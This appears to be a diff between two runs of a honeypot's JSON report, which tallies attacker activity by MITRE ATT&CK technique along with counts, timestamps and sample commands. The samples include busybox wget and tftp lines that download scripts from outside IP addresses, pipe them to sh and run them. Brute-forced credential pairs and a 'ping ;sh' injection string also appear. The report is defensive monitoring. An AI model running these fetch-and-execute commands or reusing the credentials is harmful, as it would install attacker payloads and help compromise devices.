@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-16 15:04:21",
+  "generated": "2026-08-16 16:01:45",
   "totals": {
-    "commands": 1343,
-    "login_failed": 3145,
-    "login_success": 142,
-    "sessions": 2531
+    "commands": 1359,
+    "login_failed": 3534,
+    "login_success": 146,
+    "sessions": 2727
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3145,
+      "count": 3534,
       "examples": [
         "usr1cv8 / usr1cv8",
         "serv / serv",
@@ -21,8 +21,8 @@
         "admin / Aa123456"
       ],
       "first": "2026-08-16T00:00:42.329332Z",
-      "last": "2026-08-16T15:02:39.064032Z",
-      "unique_ips": 99
+      "last": "2026-08-16T16:01:35.385878Z",
+      "unique_ips": 102
     },
     {
       "id": "T1222.002",
@@ -44,7 +44,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 170,
+      "count": 172,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -53,14 +53,14 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T14:29:13.246593Z",
-      "unique_ips": 30
+      "last": "2026-08-16T15:52:39.616893Z",
+      "unique_ips": 31
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 142,
+      "count": 146,
       "examples": [
         "admin / admin",
         "enable\\x00 / linuxshell\\x00",
@@ -69,8 +69,8 @@
         "installer / installer"
       ],
       "first": "2026-08-16T00:06:11.647402Z",
-      "last": "2026-08-16T14:37:21.622238Z",
-      "unique_ips": 79
+      "last": "2026-08-16T15:56:15.386400Z",
+      "unique_ips": 82
     },
     {
       "id": "T1033",
@@ -90,7 +90,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 13,
       "examples": [
         "uname -a",
         "/bin/./uname -s -v -n -r -m",
@@ -99,8 +99,8 @@
         "uname -a && echo '---SEP---' && nproc && echo '---SEP---' && nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/nu"
       ],
       "first": "2026-08-16T00:42:14.174728Z",
-      "last": "2026-08-16T14:37:22.650905Z",
-      "unique_ips": 9
+      "last": "2026-08-16T15:44:58.480783Z",
+      "unique_ips": 10
     },
     {
       "id": "T1083",
@@ -193,15 +193,15 @@
   "unmapped": [
     [
       "/bin/busybox",
-      393
+      394
     ],
     [
       "sh",
-      91
+      92
     ],
     [
       "shell",
-      58
+      59
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -209,11 +209,11 @@
     ],
     [
       "system",
-      40
+      41
     ],
     [
       "enable",
-      39
+      40
     ],
     [
       "shel",
@@ -221,23 +221,23 @@
     ],
     [
       "linuxshell",
-      27
+      28
     ],
     [
       "ping ;sh",
-      20
+      21
     ],
     [
       "enablelinuxshell",
-      18
+      19
     ],
     [
       "cd /proc && cat self/cmdline",
-      18
+      19
     ],
     [
       "busybox",
-      14
+      15
     ],
     [
       "sh .k",
